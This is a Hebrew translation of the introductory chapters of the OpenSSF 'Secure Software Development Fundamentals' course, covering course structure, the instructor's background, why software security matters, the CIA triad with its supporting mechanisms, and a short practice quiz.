# יסודות פיתוח תוכנה מאובטחת

מאת דייוויד א. וילר

זהו התוכן של שלישיית קורסים בקצב עצמי. ניתן ללמוד ממנו בחינם, או להגיש בקשה לתעודת סיום תמורת תשלום.

כדי *לעבור* את הקורס, ניתן לגשת  אל [דף האינטרנט OpenSSF על קורסים יסודות פיתוח תוכנה מאובטחת](https://openssf.org/training/courses/),
 ישירות אל
["פיתוח תוכנה מאובטחת" (LFD121)](https://training.linuxfoundation.org/training/developing-secure-software-lfd121/)
לאתר ההדרכה וההסמכה של קרן לינוקס, או לאתר ההדרכה וההסמכה שלו
[דף edX](https://www.edx.org/professional-certificate/linuxfoundationx-secure-software-development-fundamentals).
כדי לקבל תוכן זה בתבנית Markdown, גשו אל <https://github.com/ossf/secure-sw-dev-fundamentals>.

קורס זה מחולק ל 3 קורסים קטנים יותר (חלק 1-3), שאמורים לקחת ~14-18 שעות סך הכל:

1. פיתוח תוכנה מאובטחת - חלק א', דרישות, תכנון המערכת ושימוש חוזר [כולל את היסודות, הדרישות, תכנון המערכת, השימוש החוזר] -  ~ קורס בלבד 2-4 שעות , ~ 4-5 שעות בסך הכל כולל מבחנים לדוגמא וסקירת מידע נוסף שמסופק.

2. פיתוח תוכנה מאובטחת - חלק ב', הטמעה - ~ קורס בלבד 4-6 שעות , ~ 5-7 שעות סה"כ

3. פיתוח תוכנה מאובטחת - חלק ג', אימות ונושאים מיוחדים יותר  - ~ [מכסה אימות, מודלים של איומים, קריפטוגרפיה ונושאים מתקדמים אחרים] 3-5 שעות קורס בלבד, ~ 5-6 שעות סה"כ

חומרי למידה אלה (כולל בחנים) משוחררים תחת רישיון מסוג Creative Commons (CC-BY), במיוחד CC-BY-4.0. לכמה תמונות (למשל, מ-XKCD) יש רישיונות שונים והן מצוינות ככאלה. אנחנו לא משחררים את הפרק / בחינות הגמר בדרך זו, מחשש לעידוד רמאות. אם בנסיבות מסוימות תהיה בידיכם גישה לבחינות אלה, אנא המנעו מלשחררם, בבקשה!

אנחנו יכולים לתקן במהירות טעויות משמעותיות, אבל  מעדיפים ליישם עדכונים רק כל 1-1.5 שנים כדי שהתוכן יישאר יציב יחסית. ניתן להציע שינוי באמצעות [https://github.com/ossf/secure-sw-dev-fundamentals/issues](https://github.com/ossf/secure-sw-dev-fundamentals/issues). תוכן הקורס הזה הותאם עם החומרים שפורסמו ב-edX נכון ל-2020-12-03. אגף ההדרכה והסמכה של קרן לינוקס קובע, מניסיון, כי  בטוח  ואמין יותר לכתוב / לערוך תוכן בפלטפורמה אחרת ולאחר מכן להמיר אותו ל edX (כלומר, במקום אל תחזור על עצמך (Dont Repeat Yourself DRY) זה בטוח יותר לכתוב הכל פעמיים (Write Everything Twice WET)), כך שזה התהליך שבו אנו משתמשים. המסמך המקורי פותח באמצעות מסמכי גוגל; פורמטים אחרים הם תרגומים, שעשויים לכלול שגיאות תרגום.

גישת הלמידה נועדה לתמוך  במשתמשים רבים (עם פוטנציאל של 10-15 מיליון), ולכן כל הבעיות (כולל בדיקות ידע) חייבות להיות אוטומטיות לחלוטין. אין תוכניות להשתמש בקבוצות, דיונים או כל דבר אחר שדורש מדריכים אנושיים (מכיוון שקשה לתמוך בכך בקנה מידה גדול). ברוב המקרים בדיקות הידע הן 1-2 שאלות אמריקאיות. בדרך כלל יהיה להם *סדר אקראי* של תשובות, אך לא *ערכים אקראיים* של תשובה (לא מעורב סקריפט פייתון).

**הדרכת תורמים**

מסמך זה נכתב כדי להיות מובן בקלות על ידי הקהל שלו (במקרה זה, מפתחי ומפתחות תוכנה). באופן כללי, במסמך זה:

* יש להשתמש בקיצורים (אלא אם כן אתם רוצים דגש מיוחד על משהו).
* יש להשתמש בציטוט לוגי, לא בציטוט טיפוגרפי. הציטוטים כוללים רק את מה שמצוטט. למידע נוסף, ראה [ויקיפדיה:ציטוט לוגי בוויקיפדיה](https://en.wikipedia.org/wiki/Wikipedia:Logical_quotation_on_Wikipedia).
* יש להשתמש בפיסוק נכון תחבירית   .
* יש לצטט מקורות.

למידע נוסף, ראה [5 כללי דקדוק מטופשים שלעולם אל תעקוב אחריהם מכיוון שהם הופכים את הכתיבה שלך לגרועה יותר](https://www.inc.com/minda-zetlin/5-stupid-grammar-rules-you-should-never-follow-because-they-make-your-writing-wo.html) ו [-6 אמונות טפלות בדקדוק: הכללים לעולם לא](https://wac.colostate.edu/docs/books/grammar/chapter6.pdf).

שימו לב ש- edX דורש קבוצות בשלוש רמות: מקטעים, סעיפי משנה ויחידות. רק יחידות (רמה 3) יכולות להכיל תוכן.  אנו מייצגים זאת בחומר שלהלן באופן הבא: "כותרת 1" מייצגת את תחילתו של מקטע ומכילה רק רצפים המתחילים ב"כותרת 2" (ללא טקסט). "כותרת 2" מייצגת את תחילתו של תת-סעיף ומכילה רק רצפים המתחילים ב-"כותרת 3". "כותרת 3" מייצגת את תחילתה של יחידה ומכילה את כל התוכן. לא ניתן לכלול ישירות כותרת 3 בתוך כותרת 1. כותרת 4 (ומטה) משמשת באופן חופשי בתוך יחידה. מבחינה טכנית, חידונים (בחנים) הם ברמה 3 ב-edX, אך הם מיוצגים כרמה 4 בסימון מכיוון שהחידונים הם חלק לוגי מהקטע שהם בוחן.

התוכן העיקרי הניתן לעריכה הוא בתבנית markdown. לא אמורות להיות שגיאות סימון באמצעות התצורה שלנו. באפשרותך להוסיף היפר-קישורים למקטעים פנימיים כ- #<i>section_name </i> כאשר <i>section_name</i> היא הכותרת המומרת באמצעות האלגוריתם של GitHub [`gfm_auto_identifiers`](https://pandoc.org/MANUAL.html#extension-gfm_auto_identifiers) : הרווח הופך , האותיות `-`הגדולות (ASCII) הופכות לאותיות קטנות, וסימני הפיסוק (מלבד `-` ו`_`- ) מוסרים.

**אודות הקורס (חלק 1)**

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך למפתחי תוכנה רבים מעולם לא נאמר כיצד להתמודד ביעילות עם התקפות אלה. קורס זה מנסה לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחות תוכנה, נשות DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים, כדי לשפר את אבטחת המידע. קורס זה יאפשר למפתחי ומפתחות תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות כל פגיעויות סמויות.
קורס זה דן ביסודות האבטחה, כגון המשמעות האמיתית של ניהול סיכונים. הוא דן באופן שבו יש להתייחס לאבטחה כחלק מדרישות המערכת, ואילו דרישות אבטחה פוטנציאליות ניתן לשקול. לאחר מכן, חלק זה דן באופן שבו ניתן לתכנן תוכנה כך שתהיה מאובטחת, כולל עקרונות תכנון מאובטחים שונים שיעזרו לך להימנע מעיצובים נחותים ולאמץ עיצובים איכותיים. הוא גם דן כיצד לאבטח את שרשרת אספקת התוכנה שלך, כלומר, כיצד לבחור ולהשיג באופן מאובטח יותר תוכנות בשימוש חוזר (כולל תוכנות קוד פתוח) כדי לשפר את האבטחה.

זהו הראשון מבין שלושת הקורסים בתוכנית התעודה המקצועית של יסודות פיתוח תוכנה מאובטחת, והוא פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת האקוסיסטם (ecosystem) של הקוד הפתוח. קורסי ההכשרה הכלולים בתוכנית זו מתמקדים בצעדים מעשיים שאת ואתה (כמפתחים) יכולים לנקוט כדי להתמודד עם רוב סוגי ההתקפות הנפוצים.

**מה תלמדו (חלק 1)**

<ul>
<li>יסודות האבטחה: ניהול סיכונים, שלישיית "CIA" ודרישות.</li>
<li> עקרונות תכנון מאובטחים: מהם עקרונות כגון "הרשאה מינימלית" וכיצד ליישם עקרונות אלה.</li>
<li> הערכת שרשרת אספקה: טיפים כיצד לבחור חבילות לשימוש חוזר, וכיצד לעשות בהן שימוש חוזר כדי לקבל התראות ועדכונים במהירות.</li>
</ul>

**אודות קורס זה (חלק 2)**

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך למפתחי תוכנה רבים מעולם לא נאמר כיצד להתמודד ביעילות עם התקפות אלה. קורס זה מנסה לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחות תוכנה, נשות DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים לשיפור אבטחת המידע. קורס זה יאפשר למפתחי תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות  פגיעויות סמויות.

קורס זה מתמקד בסוגיות יישום מרכזיות: אימות קלט (כגון מדוע יש להשתמש ברשימת היתרים allow list ולא ברשימת איסורים deny list), עיבוד נתונים בצורה מאובטחת, קריאה לתוכניות אחרות, שליחת פלט וטיפול בשגיאות. הוא מתמקד בצעדים מעשיים שאתם (כמפתחים ומפתחות) יכולים לנקוט כדי להתמודד עם סוגי ההתקפות הנפוצים ביותר.

זהו הקורס השני מבין שלושת הקורסים בתוכנית התעודה המקצועית של יסודות פיתוח תוכנה מאובטחת, והוא פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת האקוסיסטם (ecosystem) של הקוד הפתוח.

**מה תלמדו (חלק 2)**

<ul>
<li>הטמעה: כיצד ליישם תוכנה מאובטחת הרבה יותר.  כולל  ביצוע אימות קלט, עיבוד נתונים בצורה מאובטחת, קריאה לתוכנות אחרות ושליחת פלט. נלמד גם על גישות מיוחדות יותר, כולל  יסודות  קריפטוגרפיה וטיפול בבעיות (כגון קוד לטיפול בשגיאות).</li>
</ul>

**אודות הקורס (חלק 3)**

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך למפתחי תוכנה רבים מעולם לא נאמר כיצד להתמודד ביעילות עם התקפות אלה. קורס זה מנסה לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחות תוכנה, נשות DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים לשיפור אבטחת המידע. קורס זה יאפשר למפתחי תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות  פגיעויות סמויות.

קורס זה דן כיצד לאמת תוכנה לצורך אבטחה. בפרט, הוא דן בגישות השונות של ניתוחים סטטיים ודינמיים, וכיצד ליישם אותן (למשל, בתהליך אינטגרציה רציפה continuous integration pipeline). הוא גם דן בנושאים מיוחדים יותר, כגון היסודות של פיתוח מודל איום ויישום יכולות קריפטוגרפיות שונות.

זהו השלישי מבין שלושת הקורסים בתוכנית התעודה המקצועית של יסודות פיתוח תוכנה מאובטחת, והוא פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת המערכת האקולוגית של הקוד הפתוח. קורסי ההכשרה הכלולים בתוכנית זו מתמקדים בצעדים מעשיים שאתה (כמפתח) יכול לנקוט כדי להתמודד עם רוב סוגי ההתקפות הנפוצים.

**מה תלמדו (חלק 3)**

<ul>
<li>אימות אבטחה: כיצד לבחון תוכנות, לכלול כמה סוגי כלים מרכזיים וכיצד ליישם אותם באינטגרציה רציפה (CI).  כולל למידה על סורקי קוד אבטחה/כלי בדיקת אבטחת יישומים סטטיים (SAST), ניתוח הרכב תוכנה (SCA)/כלי ניתוח תלות, קלטים אקראים (fuzzers) וסורקי יישומי אינטרנט.</li>
<li> מידול איומים/התקפה: כיצד לשקול את המערכת מנקודת מבטו של התוקף וכיצד ליישם גישת ניתוח עיצוב פשוטה הנקראת STRIDE.</li>
<li> Fielding: כיצד לפרוס ולתפעל תוכנה מאובטחת, לטפל בדוחות פגיעויות וכיצד לעדכן במהירות כאשר לרכיבים שנעשה בהם שימוש חוזר יש פגיעויות הידועות לציבור.</li>
<li> מקרי אבטחה ושיטות פורמליות: גישות לניתוח והצדקת ההוכחות שהתוכנה מאובטחת.</li>
</ul>

**פגוש את המדריך שלך**

דיוויד א. וילר<br>
מנהל אבטחת שרשרת אספקה בקוד פתוח בקרן<br> לינוקס
ד"ר דיוויד א. וילר הוא מומחה בפיתוח תוכנה מאובטחת ובתוכנות קוד פתוח (OSS). הוא מנהל אבטחת שרשרת האספקה בקוד פתוח בקרן לינוקס ומלמד קורסים לתארים מתקדמים בפיתוח תוכנה מאובטחת באוניברסיטת ג'ורג' מייסון (GMU) בפיירפקס, וירג'יניה. יש לו דוקטורט בטכנולוגיית מידע, תואר שני במדעי המחשב, תעודה באבטחת מידע, תעודה בהנדסת תוכנה ותואר ראשון בהנדסת אלקטרוניקה. הוא גם מומחה מוסמך לאבטחת מערכות מידע (CISSP) וחבר בכיר ב-IEEE. הוא מוביל את פרויקט תג שיטות העבודה המומלצות של קרן אבטחת הקוד הפתוח (OpenSSF) עבור קרן לינוקס ושימש כמאמת מוביל עבור שותפות אבטחת המידע הלאומית (NIAP) עבור הקריטריונים הנפוצים (אבטחה). הוא מתגורר בצפון וירג'יניה.

# תוכן עניינים

[[תוכן העניינים]]

# חלק א': דרישות, תכנון המערכת ושימוש חוזר

# מבוא לקורס

## מבוא

*לימדו את יסודות האבטחה המאפשרים פיתוח תוכנה המוקשחת מפני התקפות, והבינו כיצד ניתן להפחית את הנזק ולהאיץ את התגובה כאשר פגיעות מנוצלת לרעה.*

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך למפתחי תוכנה רבים מעולם לא נאמר כיצד להתמודד ביעילות עם התקפות אלה. קורס זה מנסה לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחות תוכנה, נשות DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים לשיפור אבטחת המידע. קורס  קורס זה יאפשר למפתחי תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות כל פגיעויות סמויות.

הקורס דן בסיכונים ודרישות, עקרונות תכנון והערכת קוד (כגון חבילות קוד) לשימוש חוזר. לאחר מכן הוא מתמקד בנושאי יישום מרכזיים: אימות קלט (למשל מדוע יש להשתמש ברשימת היתרים ולא ברשימת איסורים), עיבוד נתונים בצורה מאובטחת, קריאה לתוכניות אחרות, שליחת פלט, קריפטוגרפיה, טיפול בשגיאות ותגובה לתקריות. לאחר מכן מתקיים דיון בסוגיות אימות מסוגים שונים, כולל בדיקות,  בדיקות אבטחה ובדיקות חדירה, וכלי אבטחה. הוא מסתיים בדיון על פריסה וטיפול בדוחות פגיעות.

 * הקורס יסודות פיתוח תוכנה מאובטחת* פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת המערכת האקולוגית של הקוד הפתוח. הקורס מתמקד בצעדים מעשיים שאתם (כמפתחים ומפתחות) יכולים לנקוט כדי להתמודד עם רוב סוגי ההתקפות הנפוצים.

## הערת המחבר

תודתנו לאנשים הרבים שסיפקו פרשנות ועצות מועילות. אנו מודים במיוחד לפול א. בלאק (NIST), סטיב ליפנר (SAFECode), דן לורנץ (גוגל), שריף מנסור (OWASP), יאניק מוי (AdaCore) ואשווין רמסוואמי על המלצותיהם המתחשבות והספציפיות.

## מוטיבציה

### מוטיבציה: מדוע חשוב לאבטח תוכנה?

בכל יום יש חדשות על פריצה למערכות מחשב, לעתים קרובות באמצעות נקודות תורפה שונות בתוכנה. תוכנה לא מאובטחת עשויה:

* לשחרר מידע פרטי/סודי (המכונה *גם "לאבד סודיות"*)

* לאבד או להשחית מידע (המכונה "*לאבד את שלמותו*")

* לאבד שירות המכונה *"לאבד זמינות").*

אבל הבעיות לא נגמרות שם. כל אחד מאלה יכול לגרום להפסדים *בעולם האמיתי* . הן יכולות לעלות כסף, זמן, אמון ואפילו חיים.

עם זאת, לעתים קרובות לא אומרים למפתחים כיצד לפתח תוכנה מאובטחת. צפוי כי מפתחים שמעולם לא נאמר להם איך לעשות משהו יתקשו לעשות את זה.

קורס זה מתמקד בלסייע לך כיצד לפתח תוכנה מאובטחת באופן מעשי. בתוכנה *מאובטחת* אנו מתכוונים לתוכנה:

* שהרבה יותר קשה לתוקפים לנצל,

* שמגבילה את הנזק אם הניצול מצליח

* שבה ניתן לתקן פגיעויות ולהתאושש מחולשות יחסית במהירות 

### מוטיבציה: למה לקחת את הקורס הזה?

הדאגה העיקרית שלנו היא שתלמדו כיצד לפתח ** תוכנה מאובטחת. הנה כמה מהתכונות והיתרונות של הקורס הספציפי הזה:

1. **בחנים**. אנו שואלים שאלות חידון לאורך הדרך כדי לעזור לחזק מושגים. קל להתנתק מהספרים והסרטונים המסורתיים, מתוך מחשבה שמושגי הליבה מובנים גם כשהם לא. לעומת זאת, החידונים עוזרים לחזק את מושגי הליבה כך שתבינו אותם.

2. **חינם**. אם את רק רוצה ללמוד, זה לא עולה כלום! כל מה שאתם צריכים זה חיבור לאינטרנט. לאנשים רבים יש משאבים מוגבלים ואנחנו רוצים לוודא שהמידע הזה זמין להם.

3. **תוכן פתוח**. החומר האינפורמטיבי העיקרי הוא לא רק "חופשי" במובן של "ללא עלות" אלא גם במונחים של חופש. בפרט, התוכן האינפורמטיבי משוחרר תחת [רישיון ייחוס Creative Commons (CC-BY) גרסה 4.0, ](https://creativecommons.org/licenses/by/4.0/)כך שתוכלו להשתמש בו שוב בדרכים רבות. אנו *רוצים* שתשתמש במידע זה! יש כמה יוצאים מן הכלל; אנו מצטטים חומרים אחרים (כגון מ- XKCD) הנמצאים תחת רישיונות משלהם.

4. **עדות להשלמה**. אם תרצו להוכיח שלמדתם את החומר (בניגוד פשוט לראות טקסט כלשהו),הדבר זמין. הלומדים המשתתפים בקורס בפלטפורמת ההדרכה של קרן לינוקס יידרשו לעבור מבחן מסכם על מנת להשלים את הקורס; הם יקבלו תעודת סיום ויקבלו גם תג דיגיטלי, אותו ניתן לשתף באמצעות מדיה חברתית כדי להציג את הידע שלהם. ב- edX עדות זו להשלמה זמינה במחיר סמלי על ידי הרשמה למסלול מאומת. זה באמת יכול לעזור לך לתקשר את מה שאת ואתה יודעים למעסיקים, לקוחות או מעסיקים פוטנציאליים. לשם השוואה, עצם הבעלות על ספר לא מוכיחה שקראתם או הבנתם אותו.

5. **נגישות**. פעלנו כדי להנגיש את המידע הזה. אנחנו רוצים לוודא שמי שעיוור, לקוי ראייה, עיוורון צבעים וכן הלאה יוכל ללמוד מהחומר הזה.

6. **ישים לתוכנת קוד פתוח (OSS).** חומרים רבים על אבטחה אינם מקדישים זמן משמעותי ל- OSS, או שקשה ליישם אותם בעת פיתוח OSS. עם זאת, OSS הוא המפתח לפיתוח תוכנה מודרני. אנו כוללים מידע במיוחד עבור אלה המפתחים ו / או משתמשים ב- OSS.

7. **ללא תלות בגודל הארגון**. אנחנו לא דורשים ממך להיות בארגון פיתוח תוכנה גדול או קטן. חלק מהקורסים מניחים במרומז שאתה נמצא בארגון פיתוח תוכנה גדול.

8. **ללא תלות בשפת תכנות**. רוב מפתחי התוכנה ישתמשו במספר שפות תכנות במהלך הקריירה שלהם. לאור זאת, קורס זה מספק בסיס  בפיתוח תוכנה מאובטחת החלה על ** שפות תכנות רבות. נשתמש בדוגמאות משפות תכנות ספציפיות, אך אנו רוצים שיהיה לך בסיס איתן, לא משנה במה תשתמשו - עכשיו או בעתיד. עליך להשלים מידע זה עם חומרים עבור השפה או המסגרת הספציפית שבה אתה משתמש, אך קורס זה ייתן לך את אבני הבניין העיקריות להבנה וליישום של חומרים אחרים אלה.

9. **מעשי**. קורס זה מתמקד בעצות *מעשיות* לאנשים המפתחים תוכנה. בפרט, אנו ממליצים על דברים ספציפיים לעשות או להימנע מהם וכו '. הוא דן בקצרה מדוע עצה זו חלה, אבל זה לא קורס לתואר שני; אנו מתמקדים יותר במה ** לעשות במקום בכל התיאוריה או הפרטים הטכניים שמאחוריה.

ישנם חומרים אחרים שיכולים לספק מידע על אבטחת תוכנה. הנה כמה חלופות ראויות וניגוד להן:

1.  [* ספר הנדסת האבטחה*](https://www.cl.cam.ac.uk/~rja14/book.html) של  רוס אנדרסון מתמקד במערכות בכללותן, כולל חומרה ותהליכים עסקיים, ומתמקד בדאגות של התמונה הגדולה. עם זאת, ספר זה אינו מכסה את רוב הפרטים של איך ליישם תוכנה מאובטחת. לעומת זאת, קורס זה (בניגוד לספרו של רוס אנדרסון) מקפיד לזהות ולדון כיצד להתמודד עם הסוגים הנפוצים ביותר של פגיעויות אבטחה.

2. [SAFECode חומרי הדרכה](https://safecode.org/training/). ל-SAFECode יש מספר חומרי הדרכה זמינים. חלק מהחומרים טובים למדי והם סרטונים (בעוד שהקורס הזה הוא בעיקר טקסט). שימו לב שרבים מהחומרים שלהם ממוקדים לעתים קרובות בנושא צר. לדוגמה, הקורס שלהם  "*סקריפטים חוצי אתרים (XSS)* 101"  הוא על סוג נפוץ אחד של פגיעות, ו  "*מאובטח Java תכנות 101"* חל רק על שפה אחת. בדוק את התאריכים, מכיוון שחומרים מסוימים עשויים להיות לא מעודכנים. עם זאת, אם החומרים שלהם תואמים את מה שאתם מחפשים , הם בהחלט חלופות ראויות.

3. [מסגרת הידע של אבטחת OWASP (OWASP-SKF)](https://www.securityknowledgeframework.org/). "OWASP-SKF הוא יישום אינטרנט בקוד פתוח שמסביר עקרונות קידוד מאובטחים במספר שפות תכנות. המטרה של OWASP-SKF היא לעזור לך ללמוד ולשלב אבטחה על ידי תכנון פיתוח התוכנה שלך ולבנות יישומים מאובטחים   . OWASP-SKF עושה זאת באמצעות פרויקטים של פיתוח תוכנה הניתנים לניהול עם רשימות פעולות לביצוע  (באמצעות OWASP-ASVS[/OWASP-MASVS ](https://owasp.org/www-project-application-security-verification-standard/) או רשימות תיוג מותאמות אישית לאבטחה) ומעבדות כדי לתרגל אימות אבטחה (באמצעות SKF-Labs[, OWASP Juice-shop, ודוגמאות קוד של שיטות עבודה מומלצות מ- SKF ו](https://owasp.org/www-project-mobile-security-testing-guide/)- OWASP-Cheatsheets[](https://owasp.org/www-project-juice-shop/)[](https://cheatsheetseries.owasp.org))." לעומת זאת, קורס זה (בניגוד ל-OWASP-SKF) אינו דורש פרויקטים ומעבדות של פיתוח תוכנה.

בחרו את החומר שיספק לכם את המידע שתרצו ללמוד. אתם בהחלט יכול להשתמש בכולם.

עם זה, בואו נתחיל.

# יסודות האבטחה

פרק זה מספק סקירה כללית אודות אבטחה, כולל הגדרות של אבטחה ופרטיות, דרישות וניהול סיכונים.

מטרות הלמידה:

1. הבנה של משמעות אבטחה וסקירה של סוגי דרישות אבטחה נפוצות שונות.

2. דיון על מהותה וחשיבותה של פרטיות.

3. דיון בנוגע לניהול סיכונים.

4. דיון בנוגע להגנה לרוחב (defense-in-breadth) וכיצד ליישם מושגי אבטחה בתהליכי פיתוח תוכנה שונים.

5. הבנת החשיבות של *הגנה, זיהוי ותגובה*.

6. הבנת היסודות של טיפול בפגיעויות.

## מה אנחנו צריכים?

### מה פירוש "אבטחה"?

כדי שתתקבל תוכנה מאובטחת, עלינו להבין תחילה מה  המשמעות *של אבטחה*. לתוכנות שונות יש דרישות אבטחה שונות, אך אנשים רבים מחלקים את דרישות האבטחה לשלוש מטרות רחבות - סודיות, יושרה וזמינות:

* **סודיות**<br>"אין קריאה לא מורשית" - המשתמשים רשאים לקרוא רק את המידע שהם מורשים לקרוא.

* **(אינגריטי) יושרה**<br> "אין שינוי לא מורשה (כתיבה או מחיקה)" - משתמשים רשאים לשנות רק את המידע שהם מורשים לשנות; שינוי כולל תוספות, שינויים ומחיקות.

* **זמינות**<br>"ממשיך לעבוד בנוכחות התקפה." - התוכנה ממשיכה לעבוד בזמן שהיא תחת מתקפה. התקפת מניעת שירות (DoS) היא התקפה שמנסה להפוך את התוכנה ללא זמינה.

קבוצה זו של סודיות, יושרה וזמינות (CIA - Confidentiality, Integrity, Availability) נקראת לעתים שלישיית ה-CIA.

![שלישיית ה-CIA](cia.png)

שלישיית ה-CIA

רבים מוסיפים עוד מטרה אבטחתית אחת: **אי-התכחשות** או **מתן דין וחשבון**. המשמעות של אי-התכחשות או דין וחשבון היא שאם פעולות מסוימות  ננקטות, המערכת אמורה להיות מסוגלת להוכיח זאת מאוחר יותר, גם אם האדם המעורב מכחיש זאת מאוחר יותר. דוגמאות לפעולות כאלה הן העברת סכום כסף גדול, מחיקת משהו חשוב, שליחת הודעה חשובה או קבלת הודעה חשובה. למערכות מסוימות אין דרישות כאלה, וגם כאשר הן עושות זאת, יש אנשים הרואים בכך מקרה מיוחד של יושרה (אינטגריטי). יש אנשים שמוסיפים גם מטרות אבטחה נוספות. לא משנה איך הדברים מסווגים, חשוב לדעת בבירור מה המערכת אמורה לעשות. כמה קטגוריות פשוטות יכולות לעזור לך לעשות זאת.

מטרות אבטחה אלה זקוקות לכמה מנגנונים תומכים. לדוגמה, סודיות ויושרה דורשים שתהיה דרך לקבוע אם פעולה מורשית (אלא אם כן כל הבקשות מאושרות). הנה כמה מנגנוני תמיכה נפוצים:

* **זיהוי ואימות (I&A - Identification & Authentication)**<br>
 דרישה  מהמשתמשים והמשתמשות להזדהות ולהוכיח (לאמת) את זהותם לפני שהם עושים כל דבר הדורש הרשאה. לדוגמה, ניתן להשתמש בשם משתמש או בכתובת דואר אלקטרוני כזהות, ולהשתמש בסיסמה או באסימון (טוקן) חומרה כדי לאמת שהם באמת המשתמשים. תהליך זה נעשה בדרך כלל על ידי תהליך התחברות (login).

* **(Authorization) הרשאה**<br>
קביעת מה מותר (מורשה) למשתמש זה לעשות לפני ההחלטה לעשות זאת. ניתן לחשוב על הרשאה כרשימה של מה שכל משתמשת רשאית לעשות. אם קל לתוקף להוסיף הרשאות, אז זיהוי ואימות (I&A) מאובטח הוא חסר משמעות. מימוש הרשאות הינו קריטי ליישום סודיות ו/או יושרה. שימו לב: המילים *אימות (authentication)* *והרשאה (authorization)* דומות, אבל הן לא אותו דבר. ניתן לדעת בדיוק מיהו מישהו (אימות), אך עדיין לא לאפשר לאותו אדם לעשות משהו (הרשאה).

* **(Auditing) ביקורת**<br>
 תעד אירועים חשובים כדי לסייע בזיהוי התקפות ובהתאוששות מהן. בדרך כלל אירועים אלה כוללים כניסה, התנתקות ושינוי מידע חשוב. ביקורת היא לעתים קרובות קריטית ליישום דרישות אי-התכחשות / אחריותיות (Accountability).

מה שאתה עושה באופן ספציפי תלוי בתוכנה שאתה מפתח. אם אתה מפתח ספרייה ברמה נמוכה יותר, ייתכן שאינך תומך ישירות באף אחד ממנגנוני התמיכה הללו, אך עדיין עליך לוודא שמה שאתה עושה יתאים לתוכנית גדולה יותר.

#### חידון 1.1: מה פירוש "אבטחה"?

\>\>התאם את המונחים להגדרות הנכונות.<<

סודיות : קריאות חייבות להיות מאושרות

יושרה (אינגריטי): יש לאשר שינויים

זמינות : התוכנה ממשיכה לעבוד גם בזמן שהיא מותקפת

זהות ואימות (I&A): על המשתמשים להצהיר מי הם ולהוכיח זאת

הרשאה : קבע מה מותר למשתמש לעשות

ביקורת : תיעוד אירועים חשובים

### דרישות אבטחה

כדי ליצור תוכנה, צריך לדעת מה רוצים שהיא תעשה. הדרישות הן פשוט מה שהמוצר או השירות צריך לעשות או להיות. למטרותינו, הדרישות כוללות כל דבר הנדרש על פי חוק או תקנה, כמו גם כל דבר אשר חשוב ללקוחות / משתמשים שלה. אם משלמים לך כדי לפתח תוכנה, הדרישות בדרך כלל נרשמות איפשהו.

במקרים מסוימים, התוכנה חייבת להענות לחוקים או לתקנות מיוחדים. הדבר נכון במיוחד באזורים ותעשיות שבהם חולשות נוטות להוביל לפגיעה משמעותית (כגון מערכות רפואיות, פיננסיות וצבאיות). הדבר מתעורר גם אם התכנון הינו למכור תוכנה, או מערכת עם תוכנה, בתחומי שיפוט משפטיים רבים ושונים (כך שייתכן שיהיו חוקים או תקנות רבים החלים עליה). שוב, לענייננו אלה כל הדרישות.

ייתכן שהדרישות לא יתועדו במסמך רשמי יחיד. לפעמים כל דרישה חדשה ספציפית מתקבלת פשוט כבעיה במעקב אחר בעיות/באגים. ברוב הפרויקטים של פיתוח תוכנה, הדרישות מזוהות לאורך זמן בדיונים עם המשתמשים שלה.

הדרישות אפילו לא *צריכות* להיות כתובות כדי ליישמן, במיוחד עבור פרויקט קטן. עם זאת, לפחות במקרה של אבטחה, מומלץ לרשום את דרישות האבטחה במקום מוסכם. לאחר מכן, כאשר יהיה שימוש בתוכנה שלך או שינוי בה, יהיה מושג מה המערכת מנסה להשיג לצורכי אבטחה.

כמובן, הדרישות בפועל תלויות במה שמנסים להשיג.

